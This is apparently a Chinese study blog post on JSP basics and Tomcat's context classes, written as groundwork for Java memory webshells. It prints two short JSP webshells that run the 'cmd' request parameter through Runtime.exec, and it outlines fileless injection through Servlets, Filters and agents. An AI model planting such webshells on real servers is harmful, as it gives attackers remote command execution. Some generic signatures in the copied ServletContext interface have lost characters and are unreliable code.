很早之前就听说过python内存马，但也是粗略的学习，到java内存马，从基础一点一点学起
# jsp基础
个人觉得，其实jsp就是html和java代码的混合体，就是把html中的java代码抠出来然后把他编译成一个java文件，并把它编译成.class文件，然后返回完整的html，动态地创建网页
举个形象的例子
```jsp
<html>  
<body>  
<h2>我是html</h2>  
<% out.println("GoodBye!"); %>  
</body>  
</html>
```


其中有几个细节

## 声明
一个声明语句可以声明一个或多个变量、方法，供后面的 Java 代码使用。JSP 声明语句格式如下
```jsp
<%! 声明  %>
```
同样等价于下面的xml语句
```xml
<jsp:declaration>   
代码片段
</jsp:declaration>
```
声明中的变量，是类的 **成员变量/方法**，在当前页面（作用域）任何 `<%%>`中的java代码都共用这个变量，随着 Servlet 实例的创建而创建，直到 Servlet 销毁。
而 `<%%>`中的变量类似 **局部变量**作用域仅限当前代码块。

## jsp表达式
```jsp
<%= 表达式 %>
```
等价于
```xml
<jsp:expression>   
	表达式
</jsp:expression>
```

```jsp
<html>
<body>
<h2>Hello World!!!</h2>
<p><% String name = "Po1nt"; %>username:<%=name%></p>
</body>
</html>
```
就会输出Po1nt
## jsp指令

JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令
![](picture/Pasted%20image%2020260104214456.png)
比如我们能通过page指令来设置jsp页面的编码格式
```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
```
回显是一样的，因为 JSP 属于模板引擎

## jsp内置对象
个人理解有点像php的原生类
JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下

- 由 JSP 规范提供，不用编写者实例化
- 通过 Web 容器实现和管理
- 所有 JSP 页面均可使用
-  只有在脚本元素的表达式或代码段中才能使用

|对  象|类型|说  明|
|---|---|---|
|[request](https://drun1baby.top/jsp2/request.html)|javax.servlet.http.HttpServletRequest|获取用户请求信息|
|[response](https://drun1baby.top/jsp2/response.html)|javax.servlet.http.HttpServletResponse|响应客户端请求，并将处理信息返回到客户端|
|[out](https://drun1baby.top/jsp2/out.html)|javax.servlet.jsp.JspWriter|输出内容到 HTML 中|
|[session](https://drun1baby.top/jsp2/session.html)|javax.servlet.http.HttpSession|用来保存用户信息|
|[application](https://drun1baby.top/jsp2/application.html)|javax.servlet.ServletContext|所有用户共享信息|
|[config](https://drun1baby.top/jsp2/config.html)|javax.servlet.ServletConfig|这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数|
|[pageContext](https://drun1baby.top/jsp2/pagecontext.html)|javax.servlet.jsp.PageContext|JSP 的页面容器，用于访问 page、request、application 和 session 的属性|
|[page](https://drun1baby.top/jsp2/page_object.html)|javax.servlet.jsp.HttpJspPage|类似于 Java 类的 this 关键字，表示当前 JSP 页面|
|[exception](https://drun1baby.top/jsp2/page.html)|java.lang.Throwable|该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象。|

# 传统木马

我们先来看一看传统的最简单的 JSP 内存马是什么样子的。
```jsp
<% 
	Runtime.getRuntime().exec(request.getParameter("calc"));
%>
```
ok看着唐完了。。

我们给他加上回显的功能
```jsp
 <% if(request.getParameter("cmd")!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.print(new String(b));
    }
    out.print("</pre>");
}
%>
```
所以为了避免给文件落地，被查杀，有更加隐蔽的内存马，文件不落地

- 利用Java Web组件：动态添加恶意组件，如Servlet、Filter、Listener等。在Spring框架下就是Controller、Intercepter。
- 修改字节码：利用Java的Instrument机制，动态注入Agent，在Java内存中动态修改字节码，在HTTP请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。

# Tomcat中的Context的理解
看到很多师傅讲的有点乱，自己没太理解，所以来总结一下
## ServletContext
这是一个接口，用来作为**Servlet 的规范**

Servlet 规范规定了一个 Web 容器（如 Tomcat）的 Servlet 必须提供这些能力：
```java
package javax.servlet;
 
 
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Enumeration;
import java.util.EventListener;
import java.util.Map;
import java.util.Set;
import javax.servlet.ServletRegistration.Dynamic;
import javax.servlet.descriptor.JspConfigDescriptor;
 
 
public interface ServletContext {
    String TEMPDIR = "javax.servlet.context.tempdir";
 
    String getContextPath();
    ServletContext getContext(String var1);
    int getMajorVersion();
    int getMinorVersion();
    int getEffectiveMajorVersion();
    int getEffectiveMinorVersion();
    String getMimeType(String var1);
    Set getResourcePaths(String var1);
    URL getResource(String var1) throws MalformedURLException;
    InputStream getResourceAsStream(String var1);
    RequestDispatcher getRequestDispatcher(String var1);
    RequestDispatcher getNamedDispatcher(String var1);
    /** @deprecated */
    Servlet getServlet(String var1) throws ServletException;
    /** @deprecated */
    Enumeration getServlets();
    /** @deprecated */
    Enumeration getServletNames();
    void log(String var1);
    /** @deprecated */
    void log(Exception var1, String var2);
    void log(String var1, Throwable var2);
    String getRealPath(String var1);
    String getServerInfo();
    String getInitParameter(String var1);
    Enumeration getInitParameterNames();
    boolean setInitParameter(String var1, String var2);
    Object getAttribute(String var1);
    Enumeration getAttributeNames();
 
    void setAttribute(String var1, Object var2);
 
    void removeAttribute(String var1);
 
    String getServletContextName();
    
    Dynamic addServlet(String var1, String var2);
 
    Dynamic addServlet(String var1, Servlet var2);
 
 
    Dynamic addServlet(String var1, Class var2);
 
     extends Servlet> T createServlet(Classvar1) throws ServletException;
 
    ServletRegistration getServletRegistration(String var1);
 
    Map ? extends ServletRegistration> getServletRegistrations();
 
    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2);
 
    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2);
 
    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class var2);
 
     extends Filter> T createFilter(Classvar1) throws ServletException;
    FilterRegistration getFilterRegistration(String var1);
    Map ? extends FilterRegistration> getFilterRegistrations();
    SessionCookieConfig getSessionCookieConfig();
    void setSessionTrackingModes(Setvar1);
 
    Set getDefaultSessionTrackingModes();
 
    Set getEffectiveSessionTrackingModes();
 
    void addListener(String var1);
     extends EventListener> void addListener(T var1);
 
    void addListener(Class var1);
     extends EventListener> T createListener(Classvar1) throws ServletException;
    JspConfigDescriptor getJspConfigDescriptor();
    ClassLoader getClassLoader();
    void declareRoles(String... var1);
}
```
可以看到ServletContext接口中定义了很多操作，能对Servlet中的各种资源进行访问、添加、删除等。

## ApplicationContext
`org.apache.catalina.core.ApplicationContext` ，它是 Tomcat 内部用来直接实现 `ServletContext` 接口的一个类。它是 `StandardContext` 的一个**外观（Facade）**。Tomcat 不想让你直接操作最底层的 `StandardContext`，所以套了一个 `ApplicationContext` 给你用。只暴露你想用的功能（比如 `getAttribute`）
## Context
这是 Tomcat 内部定义的一个接口
Tomcat 把自己的结构分成了四级：Engine（经理）、Host（组长）、**Context（员工）**、Wrapper（实习生）。
`StandardContext` 就是那个担任了“Context （员工）”职位的具体的人。它实现了 `Context` 接口。

在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。

## StandardContext
这是对  `Context`的 核心实现类，是 `ApplicationContext`这个门面去除封装后的真正实现类
里面有一个web应用在Tomcat内存里的全部东西，所有的 Filter、所有的 Servlet 实例、配置信息）全部存在这个 `StandardContext` 对象里。










